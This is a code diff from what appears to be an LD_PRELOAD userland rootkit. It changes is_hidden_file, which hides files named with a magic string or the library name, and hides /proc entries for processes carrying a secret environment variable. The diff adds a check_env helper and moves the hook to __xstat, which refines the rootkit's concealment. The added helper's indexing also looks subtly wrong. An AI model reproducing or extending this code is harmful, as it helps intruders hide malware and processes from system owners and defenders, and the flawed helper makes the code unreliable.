@@ -31,6 +31,16 @@
  * identify the process as a hidden one or not.
  */
 
+static int  check_env(char *haystack, const char *needle) {
+    size_t index = 0;
+    while (index < MAX_LEN) {
+        if (strstr(haystack + index, needle))
+            return (1);
+        index += strlen(haystack) + 1;
+    }
+    return (0);
+}
+
 int         is_hidden_file(const char *path) {
     DEBUG(D_INFO, "called is_hidden_file()");
 
@@ -42,16 +52,17 @@ int         is_hidden_file(const char *path) {
     if (strstr(path, MAGIC_STRING) || strstr(path, LIBRARY_NAME))
         return (1);
 
+
     if (strstr(path, PROC_PATH)) {
-        if (REAL_STAT(path, &s_fstat) != -1) {
+        if (REAL___XSTAT(_STAT_VER, path, &s_fstat) != -1) {
             snprintf(environ, PATH_MAX, ENV_LINE, path);
 
-            if (REAL_STAT(environ, &s_fstat) != -1) {
+            if (REAL___XSTAT(_STAT_VER, environ, &s_fstat) != -1) {
                 env_file = REAL_FOPEN(environ, "r");
 
                 if (env_file) {
                     while (fgets(line, MAX_LEN, env_file)) {
-                        if (strstr(line, HIDDEN_ENV_VAR))
+                        if (check_env(line, HIDDEN_ENV_VAR))
                             return 1;
 
                         memset(line, 0x00, MAX_LEN);
